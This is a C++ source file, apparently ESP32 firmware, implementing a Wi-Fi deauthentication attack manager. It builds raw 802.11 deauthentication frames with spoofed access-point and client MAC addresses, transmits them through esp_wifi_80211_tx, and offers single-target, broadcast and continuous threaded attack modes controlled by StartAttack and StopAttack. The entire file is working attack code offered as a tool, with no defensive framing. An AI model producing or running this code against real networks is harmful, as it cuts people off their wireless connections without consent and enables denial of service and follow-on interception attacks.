#include "DeauthManager.hpp"
#include <esp_wifi.h>
#include <cstring>

using namespace std;

DeauthManager& DeauthManager::GetInstance()
{
    static DeauthManager instance;
    return instance;
}

void DeauthManager::SendDeauthPacket(const MacAddress& apMac, const MacAddress& clientMac, uint16_t reasonCode)
{
    uint8_t frame[26] = {
        0xC0, 0x00, 
        0x3A, 0x01, 
        0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 0x00, 0x00, 0x00, 0x00, 
        0x00, 0x00, 
        0x07, 0x00  
    };

    memcpy(&frame[4], clientMac.addr, 6);
    memcpy(&frame[10], apMac.addr, 6);
    memcpy(&frame[16], apMac.addr, 6);

    frame[24] = reasonCode & 0xFF;
    frame[25] = (reasonCode >> 8) & 0xFF;

    esp_wifi_80211_tx(WIFI_IF_STA, frame, sizeof(frame), true);
}

void DeauthManager::StartAttack(AttackMode mode, const MacAddress& apMac, uint8_t channel, const MacAddress& clientMac)
{
    if (isAttacking_.load()) StopAttack();

    currentMode_ = mode;
    targetAp_ = apMac;
    targetClient_ = clientMac;
    targetChannel_ = channel;
    
    isAttacking_.store(true);

    if (mode == AttackMode::SingleTarget || mode == AttackMode::BroadcastAP)
    {
        esp_wifi_set_channel(targetChannel_, WIFI_SECOND_CHAN_NONE);
        
        if (mode == AttackMode::SingleTarget)
            SendDeauthPacket(targetAp_, targetClient_);
        else
            SendDeauthPacket(targetAp_, {0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF});
            
        isAttacking_.store(false);
        currentMode_ = AttackMode::None;
    }
    else
    {
        xTaskCreate(AttackTask, "AttackTask", 3072, this, 2, &attackTaskHandle_);
    }
}

void DeauthManager::StopAttack()
{
    if (!isAttacking_.load()) return;
    
    isAttacking_.store(false);
    
    if (attackTaskHandle_ != nullptr)
    {
        vTaskDelay(pdMS_TO_TICKS(50));
        if (attackTaskHandle_ != nullptr) 
        {
             vTaskDelete(attackTaskHandle_);
             attackTaskHandle_ = nullptr;
        }
    }
    currentMode_ = AttackMode::None;
}